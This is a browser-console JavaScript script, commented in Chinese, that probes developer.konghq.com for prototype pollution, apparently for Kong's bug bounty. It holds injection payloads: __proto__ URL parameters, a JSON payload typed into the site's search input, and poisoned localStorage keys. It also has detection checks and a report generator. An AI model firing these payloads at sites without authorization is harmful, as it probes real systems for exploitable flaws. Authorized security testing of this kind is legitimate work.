// ============================================================================
// 原型污染浏览器测试脚本
// 使用方法：复制到浏览器 Console (F12) 中执行
// 目标: https://developer.konghq.com
// ============================================================================

console.log("=".repeat(80));
console.log("🎯 原型污染自动化测试");
console.log("=".repeat(80));
console.log("");

// 测试结果存储
const testResults = [];

// ============================================================================
// 测试1: URL参数注入
// ============================================================================
async function testURLParameters() {
    console.log("\n" + "=".repeat(80));
    console.log("测试 1: URL参数注入");
    console.log("=".repeat(80));
    
    const testCases = [
        { name: "filter[__proto__][test]", value: "123" },
        { name: "search[__proto__][admin]", value: "true" },
        { name: "q[__proto__][xss]", value: "test" },
        { name: "__proto__[polluted]", value: "yes" },
        { name: "constructor.prototype.test", value: "abc" }
    ];
    
    for (const testCase of testCases) {
        console.log(`\n[测试] ${testCase.name}=${testCase.value}`);
        
        // 构造测试URL
        const testURL = `${window.location.origin}/plugins/?${testCase.name}=${testCase.value}`;
        console.log(`  URL: ${testURL}`);
        
        // 检查当前页面是否已被污染
        const beforeValue = {}.test;
        console.log(`  污染前: {}.test = ${beforeValue}`);
        
        // 提示用户手动访问
        console.log(`  ⚠️  请手动访问上面的URL，然后回来继续测试`);
        
        // 等待用户操作
        await new Promise(resolve => {
            setTimeout(() => {
                const afterValue = {}.test;
                console.log(`  污染后: {}.test = ${afterValue}`);
                
                if (afterValue !== undefined && afterValue !== beforeValue) {
                    console.log(`  ✅ 发现污染！{}.test = ${afterValue}`);
                    testResults.push({
                        test: "URL参数注入",
                        payload: testCase.name,
                        result: "SUCCESS",
                        evidence: `{}.test = ${afterValue}`
                    });
                } else {
                    console.log(`  ❌ 未发现污染`);
                    testResults.push({
                        test: "URL参数注入",
                        payload: testCase.name,
                        result: "FAILED",
                        evidence: "No pollution detected"
                    });
                }
                resolve();
            }, 5000); // 等待5秒让用户访问
        });
    }
}

// ============================================================================
// 测试2: 直接检查当前状态
// ============================================================================
function checkCurrentPollution() {
    console.log("\n" + "=".repeat(80));
    console.log("测试 2: 检查当前是否已被污染");
    console.log("=".repeat(80));
    
    const checks = [
        { name: "{}.test", value: {}.test },
        { name: "{}.polluted", value: {}.polluted },
        { name: "{}.isAdmin", value: {}.isAdmin },
        { name: "{}.xss", value: {}.xss },
        { name: "Object.prototype.test", value: Object.prototype.test },
        { name: "Object.prototype.polluted", value: Object.prototype.polluted }
    ];
    
    let found = false;
    
    for (const check of checks) {
        console.log(`  ${check.name} = ${check.value}`);
        if (check.value !== undefined) {
            console.log(`    ⚠️  非undefined值！可能被污染了`);
            found = true;
        }
    }
    
    if (found) {
        console.log("\n  🔴 发现可能的污染！请记录上面的输出");
        testResults.push({
            test: "当前状态检查",
            payload: "N/A",
            result: "POTENTIAL_POLLUTION",
            evidence: checks.filter(c => c.value !== undefined).map(c => `${c.name}=${c.value}`).join(", ")
        });
    } else {
        console.log("\n  ✅ 当前未检测到污染");
        testResults.push({
            test: "当前状态检查",
            payload: "N/A",
            result: "CLEAN",
            evidence: "All values are undefined"
        });
    }
}

// ============================================================================
// 测试3: 监控对象变化
// ============================================================================
function monitorObjectChanges() {
    console.log("\n" + "=".repeat(80));
    console.log("测试 3: 监控对象变化（运行10秒）");
    console.log("=".repeat(80));
    
    console.log("  开始监控...");
    console.log("  在另一个标签页访问带payload的URL，观察这里的变化\n");
    
    const originalToString = Object.prototype.toString;
    let changeDetected = false;
    
    // 设置定时器检查
    const interval = setInterval(() => {
        const testValue = {}.test;
        const pollutedValue = {}.polluted;
        
        if (testValue !== undefined || pollutedValue !== undefined) {
            console.log(`\n  🔴 检测到变化！`);
            console.log(`     {}.test = ${testValue}`);
            console.log(`     {}.polluted = ${pollutedValue}`);
            
            changeDetected = true;
            clearInterval(interval);
            
            testResults.push({
                test: "实时监控",
                payload: "Monitoring",
                result: "POLLUTION_DETECTED",
                evidence: `{}.test=${testValue}, {}.polluted=${pollutedValue}`
            });
        }
    }, 1000);
    
    // 10秒后停止
    setTimeout(() => {
        clearInterval(interval);
        if (!changeDetected) {
            console.log("\n  ✅ 10秒内未检测到变化");
            testResults.push({
                test: "实时监控",
                payload: "Monitoring",
                result: "NO_CHANGE",
                evidence: "No changes detected in 10 seconds"
            });
        }
    }, 10000);
}

// ============================================================================
// 测试4: 尝试通过输入框注入
// ============================================================================
function testInputInjection() {
    console.log("\n" + "=".repeat(80));
    console.log("测试 4: 通过输入框注入");
    console.log("=".repeat(80));
    
    // 查找所有输入框
    const inputs = document.querySelectorAll('input[type="text"], input[type="search"], input:not([type])');
    console.log(`  找到 ${inputs.length} 个输入框\n`);
    
    if (inputs.length === 0) {
        console.log("  ❌ 未找到输入框");
        testResults.push({
            test: "输入框注入",
            payload: "N/A",
            result: "NO_INPUTS",
            evidence: "No input fields found"
        });
        return;
    }
    
    // 在第一个输入框中注入
    const targetInput = inputs[0];
    const payload = '{"__proto__":{"injected":true}}';
    
    console.log(`  目标输入框:`, targetInput);
    console.log(`  Payload: ${payload}\n`);
    
    // 记录污染前的状态
    const beforeValue = {}.injected;
    console.log(`  污染前: {}.injected = ${beforeValue}`);
    
    // 注入payload
    targetInput.value = payload;
    targetInput.dispatchEvent(new Event('input', { bubbles: true }));
    targetInput.dispatchEvent(new Event('change', { bubbles: true }));
    targetInput.dispatchEvent(new Event('blur', { bubbles: true }));
    
    console.log(`  ✅ 已注入payload`);
    console.log(`  请触发搜索/过滤功能，然后检查下面的结果\n`);
    
    // 等待2秒后检查
    setTimeout(() => {
        const afterValue = {}.injected;
        console.log(`  污染后: {}.injected = ${afterValue}`);
        
        if (afterValue !== undefined && afterValue !== beforeValue) {
            console.log(`  🔴 发现污染！`);
            testResults.push({
                test: "输入框注入",
                payload: payload,
                result: "SUCCESS",
                evidence: `{}.injected = ${afterValue}`
            });
        } else {
            console.log(`  ❌ 未发现污染`);
            testResults.push({
                test: "输入框注入",
                payload: payload,
                result: "FAILED",
                evidence: "No pollution detected"
            });
        }
    }, 2000);
}

// ============================================================================
// 测试5: LocalStorage注入
// ============================================================================
function testLocalStorageInjection() {
    console.log("\n" + "=".repeat(80));
    console.log("测试 5: LocalStorage注入");
    console.log("=".repeat(80));
    
    const payloads = [
        { key: 'kapa-config', value: JSON.stringify({ __proto__: { test: 123 } }) },
        { key: '__proto__', value: JSON.stringify({ polluted: true }) },
        { key: 'config', value: JSON.stringify({ constructor: { prototype: { x: 1 } } }) }
    ];
    
    for (const payload of payloads) {
        console.log(`\n  [测试] localStorage.${payload.key} = ${payload.value}`);
        
        const beforeValue = {}.test;
        
        try {
            localStorage.setItem(payload.key, payload.value);
            console.log(`    ✅ 已设置`);
            
            // 检查是否被污染
            const afterValue = {}.test;
            console.log(`    污染前: {}.test = ${beforeValue}`);
            console.log(`    污染后: {}.test = ${afterValue}`);
            
            if (afterValue !== undefined && afterValue !== beforeValue) {
                console.log(`    🔴 发现污染！`);
                testResults.push({
                    test: "LocalStorage注入",
                    payload: payload.key,
                    result: "SUCCESS",
                    evidence: `{}.test = ${afterValue}`
                });
            } else {
                console.log(`    ❌ 未发现污染`);
            }
            
            // 清理
            localStorage.removeItem(payload.key);
            
        } catch (e) {
            console.log(`    ❌ 错误: ${e.message}`);
        }
    }
}

// ============================================================================
// 生成测试报告
// ============================================================================
function generateReport() {
    console.log("\n" + "=".repeat(80));
    console.log("📊 测试报告");
    console.log("=".repeat(80));
    
    console.log(`\n总测试数: ${testResults.length}`);
    
    const success = testResults.filter(r => r.result === "SUCCESS" || r.result === "POLLUTION_DETECTED" || r.result === "POTENTIAL_POLLUTION");
    const failed = testResults.filter(r => r.result === "FAILED" || r.result === "NO_CHANGE" || r.result === "CLEAN");
    
    console.log(`成功: ${success.length}`);
    console.log(`失败: ${failed.length}`);
    
    if (success.length > 0) {
        console.log("\n🔴 发现的漏洞:");
        success.forEach((result, index) => {
            console.log(`\n  [${index + 1}] ${result.test}`);
            console.log(`      Payload: ${result.payload}`);
            console.log(`      证据: ${result.evidence}`);
        });
        
        console.log("\n" + "=".repeat(80));
        console.log("🎉 恭喜！发现了原型污染漏洞！");
        console.log("=".repeat(80));
        console.log("\n下一步:");
        console.log("  1. 截图保存证据");
        console.log("  2. 编写详细的PoC");
        console.log("  3. 评估实际影响");
        console.log("  4. 提交漏洞报告");
    } else {
        console.log("\n✅ 未发现原型污染漏洞");
        console.log("\n可能的原因:");
        console.log("  1. 网站是纯静态的，没有后端合并逻辑");
        console.log("  2. JavaScript代码虽然包含__proto__，但无法从用户输入到达");
        console.log("  3. 有防护机制阻止了污染");
        console.log("\n建议:");
        console.log("  • 这可能只是代码质量问题，不是安全漏洞");
        console.log("  • 不符合Kong的漏洞赏金要求");
        console.log("  • 建议放弃或转向其他测试方向");
    }
    
    console.log("\n" + "=".repeat(80));
}

// ============================================================================
// 主函数：执行所有测试
// ============================================================================
async function runAllTests() {
    console.log("准备开始测试...\n");
    console.log("⚠️  重要提示:");
    console.log("   某些测试需要你手动访问特定的URL");
    console.log("   请按照Console中的指示操作\n");
    
    // 测试1: 检查当前状态
    checkCurrentPollution();
    
    // 测试2: LocalStorage注入
    testLocalStorageInjection();
    
    // 测试3: 输入框注入
    testInputInjection();
    
    // 测试4: 监控变化
    monitorObjectChanges();
    
    // 等待一段时间后生成报告
    setTimeout(() => {
        generateReport();
    }, 15000); // 15秒后生成报告
}

// ============================================================================
// 快速测试函数（单独使用）
// ============================================================================

// 快速检查是否被污染
function quickCheck() {
    console.log("快速检查原型污染状态:\n");
    console.log("{}.test =", {}.test);
    console.log("{}.polluted =", {}.polluted);
    console.log("{}.isAdmin =", {}.isAdmin);
    console.log("Object.prototype.test =", Object.prototype.test);
    console.log("\n如果以上有任何非undefined的值，说明可能被污染了！");
}

// 清除所有可能的污染（用于重置测试环境）
function clearPollution() {
    console.log("尝试清除污染...\n");
    
    delete Object.prototype.test;
    delete Object.prototype.polluted;
    delete Object.prototype.isAdmin;
    delete Object.prototype.injected;
    delete Object.prototype.xss;
    
    console.log("已删除常见的污染属性");
    console.log("刷新页面可以完全重置");
}

// ============================================================================
// 启动测试
// ============================================================================
console.log("选择测试模式:");
console.log("  1. runAllTests() - 运行所有测试（推荐）");
console.log("  2. quickCheck() - 快速检查当前状态");
console.log("  3. clearPollution() - 清除污染（重置）");
console.log("\n输入命令开始测试...\n");

// 自动运行快速检查
quickCheck();
